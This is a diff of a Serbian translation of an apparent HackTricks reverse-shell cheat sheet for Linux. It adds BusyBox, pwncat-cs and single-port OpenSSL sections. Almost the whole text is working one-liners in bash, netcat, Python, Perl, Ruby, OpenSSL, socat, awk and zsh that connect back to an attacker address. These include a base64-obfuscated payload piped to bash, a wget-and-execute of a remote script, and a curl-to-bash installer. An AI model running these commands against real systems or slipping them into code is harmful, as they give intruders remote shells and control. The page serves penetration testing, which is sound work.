@@ -2,11 +2,11 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Ako imate pitanja o bilo kojoj od ovih ljuski, možete ih proveriti na** [**https://explainshell.com/**](https://explainshell.com)
+**Ako imate pitanja o bilo kojoj od ovih shell-ova, možete ih proveriti pomoću** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
-**Kada dobijete reverznu ljusku**[ **pročitajte ovu stranicu da dobijete pun TTY**](full-ttys.md)**.**
+**Kada dobijete reverse shell**[ **pročitajte ovu stranicu da biste dobili full TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -21,7 +21,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Ne zaboravite da proverite sa drugim shell-ovima: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.
+Ne zaboravi da proveriš i druge shell-ove: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, i bash.
 
 ### Symbol safe shell
 ```bash
@@ -32,26 +32,26 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### Objašnjenje shell-a
+#### Објашњење shell-a
 
-1. **`bash -i`**: Ovaj deo komande pokreće interaktivni (`-i`) Bash shell.
-2. **`>&`**: Ovaj deo komande je skraćena notacija za **preusmeravanje standardnog izlaza** (`stdout`) i **standardne greške** (`stderr`) na **istu destinaciju**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP vezu sa navedenom IP adresom i portom**.
-- Preusmeravanjem izlaza i tokova grešaka na ovaj fajl, komanda efikasno šalje izlaz interaktivne shell sesije na mašinu napadača.
-4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na istu destinaciju kao standardni izlaz (`stdout`)**.
+1. **`bash -i`**: Овај део команде покреће интерактивни (`-i`) Bash shell.
+2. **`>&`**: Овај део команде је скраћена нотација за **преусмеравање и стандардног излаза** (`stdout`) и **стандардне грешке** (`stderr`) на **исто одредиште**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Ово је специјална датотека која **представља TCP везу ка наведеној IP адреси и порту**.
+- Преусмеравањем излазног и error stream-ова у ову датотеку, команда ефективно шаље излаз интерактивне shell сесије на нападачеву машину.
+4. **`0>&1`**: Овај део команде **преусмерава стандардни улаз** (`stdin`) на исто одредиште као и стандардни излаз** (`stdout`).
 
-### Kreiraj u fajlu i izvrši
+### Креирај у фајлу и изврши
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Forward Shell
 
-Kada se suočavate sa **Remote Code Execution (RCE)** ranjivošću unutar Linux-bazirane web aplikacije, postizanje reverse shell-a može biti otežano mrežnim odbranama poput iptables pravila ili složenih mehanizama filtriranja paketa. U takvim ograničenim okruženjima, alternativni pristup uključuje uspostavljanje PTY (Pseudo Terminal) shell-a za efikasniju interakciju sa kompromitovanim sistemom.
+Kada se radi o ranjivosti **Remote Code Execution (RCE)** unutar Linux-based web application, postizanje reverse shell može biti otežano network odbranama poput iptables pravila ili složenih mehanizama packet filtering. U ovakvim ograničenim okruženjima, alternativni pristup uključuje uspostavljanje PTY (Pseudo Terminal) shell-a za efikasniju interakciju sa compromised sistemom.
 
-Preporučeni alat za ovu svrhu je [toboggan](https://github.com/n3rada/toboggan.git), koji pojednostavljuje interakciju sa ciljnim okruženjem.
+Preporučen alat za ovu svrhu je [toboggan](https://github.com/n3rada/toboggan.git), koji pojednostavljuje interakciju sa target okruženjem.
 
-Da biste efikasno koristili toboggan, kreirajte Python modul prilagođen RCE kontekstu vašeg ciljnog sistema. Na primer, modul nazvan `nix.py` mogao bi biti strukturiran na sledeći način:
+Da biste efikasno koristili toboggan, kreirajte Python module prilagođen RCE kontekstu vašeg target sistema. Na primer, modul pod nazivom `nix.py` može biti strukturisan na sledeći način:
 ```python3
 import jwt
 import httpx
@@ -75,21 +75,21 @@ response.raise_for_status()
 
 return response.text
 ```
-А онда, можете покренути:
+I onda možete pokrenuti:
 ```shell
 toboggan -m nix.py -i
 ```
-Da biste direktno iskoristili interaktivnu ljusku. Možete dodati `-b` za Burpsuite integraciju i ukloniti `-i` za osnovniji rce omotač.
+Da biste direktno iskoristili interractive shell. Možete dodati `-b` za Burpsuite integraciju i ukloniti `-i` za jednostavniji rce wrapper.
 
 Druga mogućnost je korišćenje `IppSec` forward shell implementacije [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
-Samo treba da modifikujete:
+Treba samo da izmenite:
 
 - URL ranjivog hosta
-- Prefiks i sufiks vašeg payload-a (ako ih ima)
-- Način na koji se payload šalje (zaglavlja? podaci? dodatne informacije?)
+- prefiks i sufiks vašeg payload-a (ako postoje)
+- način slanja payload-a (headers? data? extra info?)
 
-Zatim, možete jednostavno **slati komande** ili čak **koristiti `upgrade` komandu** da dobijete pun PTY (napomena: cevi se čitaju i pišu sa približno 1.3s kašnjenjem).
+Zatim možete jednostavno **slati komande** ili čak **koristiti `upgrade` komandu** da dobijete puni PTY (imajte na umu da se pipes čitaju i upisuju sa približnim kašnjenjem od 1.3s).
 
 ## Netcat
 ```bash
@@ -99,9 +99,21 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp
 nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
+## BusyBox
+
+Veoma čest u **routerima**, **ugrađenim uređajima**, **kontejnerima** i ogoljenim Linux aparatima. Ako nema zaseban `nc`, proveri da li ga BusyBox izlaže:
+```bash
+busybox --list-full | grep -E '(^|/)nc$'
+busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
+busybox nc <ATTACKER-IP> <PORT> -e sh
+```
+Ako `busybox nc` postoji, ali je interaktivno izvršavanje nepouzdano, FIFO obrazac iz `nc` sekcije obično i dalje radi:
+```bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
+```
 ## gsocket
 
-Proverite to na [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
+Proveri ga na [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -118,7 +130,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Da biste poslali komandu, otkucajte je, pritisnite enter i pritisnite CTRL+D (da zaustavite STDIN)
+Da pošalješ komandu, otkucaj je, pritisni enter i zatim CTRL+D (da zaustaviš STDIN)
 
 **Žrtva**
 ```bash
@@ -137,7 +149,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
-## Руби
+## Ruby
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -219,14 +231,14 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
-## Zsh (ugrađena TCP)
+## Zsh (ugrađeni TCP)
 ```bash
 # Requires no external binaries; leverages zsh/net/tcp module
 zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – moderan netcat-sličan slušalac napisan u Rustu (pakovan u Kali od 2024).
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – modernni listener nalik netcat-u napisan u Rust-u (pakovan u Kali od 2024).
 ```bash
 # Attacker – interactive TLS listener with history & tab-completion
 rcat listen -ib 55600
@@ -238,12 +250,25 @@ curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_6
 ```
 Features:
 - Opcioni `--ssl` flag za enkriptovani transport (TLS 1.3)
-- `-s` za pokretanje bilo kog binarnog fajla (npr. `/bin/sh`, `python3`) na žrtvi
-- `--up` za automatsko unapređenje na potpuno interaktivni PTY
+- `-s` za pokretanje bilo kog binary-ja (npr. `/bin/sh`, `python3`) na žrtvi
+- `--up` za automatsku nadogradnju u potpuno interaktivni PTY
 
-## revsh (enkriptovan & spreman za pivotiranje)
+## pwncat-cs
 
-`revsh` je mali C klijent/server koji pruža pun TTY preko **enkriptovanog Diffie-Hellman tunela** i može opcionalno da priključi **TUN/TAP** interfejs za obrnuto VPN-pivotiranje.
+Ako već imate **bilo koji raw reverse shell** ali želite listener koji automatski pokušava da ga nadogradi u korisniju sesiju, `pwncat-cs` je dobra moderna zamena za običan `nc -lvnp` listener.
+```bash
+# Attacker - catch a plain reverse shell and auto-upgrade it when possible
+python3 -m pip install --user pwncat-cs
+pwncat-cs -lp 4444
+
+# Victim - reuse any payload from this page
+bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
+```
+Takođe podržava **encrypted** `ssl-bind` i `ssl-connect` kanale, pa ga možete upariti sa `ncat --ssl` ili `socat OPENSSL:` payloads kada vam je potrebna transportna enkripcija.
+
+## revsh (encrypted & pivot-ready)
+
+`revsh` je mali C client/server koji obezbeđuje pun TTY preko **encrypted Diffie-Hellman tunnel** i po potrebi može da poveže i **TUN/TAP** interfejs za reverse VPN-like pivoting.
 ```bash
 # Build (or grab a pre-compiled binary from the releases page)
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -254,22 +279,31 @@ revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
 # Victim – reverse shell over TLS to the attacker
 ./revsh <ATTACKER-IP>:443
 ```
-Korisne zastavice:
+Korisni flagovi:
 - `-b` : bind-shell umesto reverse
 - `-p socks5://127.0.0.1:9050` : proxy kroz TOR/HTTP/SOCKS
-- `-t` : kreiraj TUN interfejs (reverse VPN)
+- `-t` : kreira TUN interfejs (reverse VPN)
 
-Pošto je cela sesija enkriptovana i multiplexovana, često zaobilazi jednostavno egress filtriranje koje bi ubilo plain-text `/dev/tcp` shell.
+Pošto je cela sesija enkriptovana i multipleksirana, često zaobilazi jednostavno egress filtriranje koje bi ubilo plain-text `/dev/tcp` shell.
 
 ## OpenSSL
+
+**Jednostruki enkriptovani reverse shell** je obično praktičniji od klasičnog obrasca sa dva listener-a jer ga je lakše proxy-ovati kroz `443` i jednostavnije automatizovati.
 
 Napadač (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
-openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
-openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
+openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
 ```
 Žrtva
+```bash
+#Linux - one-port TLS shell using a named pipe
+mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
+
+#If the target needs SNI / hostname validation to blend with a fronted TLS service
+mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
+```
+Možete i dalje koristiti klasični **two-listener** pattern kada želite odvojene input/output kanale:
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -286,7 +320,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-### Obrnuta ljuska
+### Reverse shell
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -301,9 +335,9 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Da biste poslali komandu, otkucajte je, pritisnite enter i pritisnite CTRL+D (da zaustavite STDIN)
+Da biste poslali komandu, otkucajte je, pritisnite Enter i zatim CTRL+D (da zaustavite STDIN)
 
-**Žrtva**
+**Victim**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -334,11 +368,11 @@ close(Service)
 ```
 ## Xterm
 
-Ovo će pokušati da se poveže sa vašim sistemom na portu 6001:
+Ovo će pokušati da se poveže na vaš sistem na portu 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Da biste uhvatili reverznu školjku, možete koristiti (koja će slušati na portu 6001):
+Da biste uhvatili reverse shell možete koristiti (koji će slušati na portu 6001):
 ```bash
 # Authorize host
 xhost +targetip
@@ -347,7 +381,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NAPOMENA: Java reverse shell takođe radi za Groovy
+od [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell takođe radi za Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -362,5 +396,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
 - [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
+- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)
+- [https://gtfobins.org/gtfobins/busybox/](https://gtfobins.org/gtfobins/busybox/)
 
 {{#include ../../banners/hacktricks-training.md}}
